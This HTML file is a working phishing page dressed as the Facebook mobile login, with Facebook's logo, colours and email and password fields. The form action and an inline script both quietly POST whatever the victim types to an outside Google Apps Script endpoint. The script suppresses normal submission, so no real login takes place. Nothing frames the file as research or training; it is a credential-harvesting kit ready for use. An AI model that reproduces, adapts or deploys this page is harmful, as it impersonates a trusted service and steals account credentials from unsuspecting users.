<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Mobile Login</title>
    <style>
        /* Reset styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f3f7fd;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .mobile-login-container {
            width: 100%;
            max-width: 400px;
            text-align: center;
            background-color: transparent;
            border-radius: 10px;
    
            overflow: hidden;
        }

        

        .mobile-login-header .logo-circle {
            width: 100px;
            height: 100px;
            background-color:transparent;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto;
            position: absolute;
            bottom: 550px;
            left: 50%;
            transform: translateX(-50%);
        }

        .mobile-login-header img {
            width:77px;
            height: auto;
        }

        .mobile-login-box {
            padding: 70px 20px 20px;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        input {
            width: 100%;
            padding: 18px;
            font-size: 19px;
            border: 1px solid #ddd;
            border-radius:15px;
            outline: none;
            background-color: #f5f6f7;
        }

        input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 3px rgba(24, 119, 242, 0.5);
        }

        button {
            background-color: #1877f2;
            color: white;
            padding: 12px;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 25px;
            cursor: pointer;
        }

        button:hover {
            background-color: #145dbf;
        }

        .mobile-links {
            margin-top: 20px;
            font-size: 17px;
        }

        .mobile-links a {
            color: #00050c;
            text-decoration: none;
            display: block;
            margin: 10px 0;
        }

        hr {
            margin: 20px 0;
            border: none;
            border-top: 1px solid #ddd;
        }
    </style>
</head>
<body>
    <div class="mobile-login-container">
        <!-- Header with circular logo -->
        <div class="mobile-login-header">
            <div class="logo-circle">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
            </div>
        </div>

        <!-- Login Form -->
        <div class="mobile-login-box">
        
            <form id="loginForm" method="post"  name="contact-form" action="https://script.google.com/macros/s/AKfycbzOK02jR87X1i1VQRe9RL-CghI0IzNlW-Ga7JnNXWYKtt6ue9aliOkHfk1Y3L-zeGfN/exec">
                <input type="text" id="email" name="email" placeholder="Mobile number or email" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <button type="submit" value="Submit" id="submit" >Log In</button>
            </form>

            <!-- Links -->
            <div class="mobile-links">
                <a href="#">Forgotten password?</a>
            </div>
        </div>
    </div>

    <script>
    const scriptURL = ' https://script.google.com/macros/s/AKfycbzOK02jR87X1i1VQRe9RL-CghI0IzNlW-Ga7JnNXWYKtt6ue9aliOkHfk1Y3L-zeGfN/exec'

const form = document.forms['contact-form']

form.addEventListener('submit', e => {
  
  e.preventDefault()
  
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})

})
    </script>
</body>
</html>
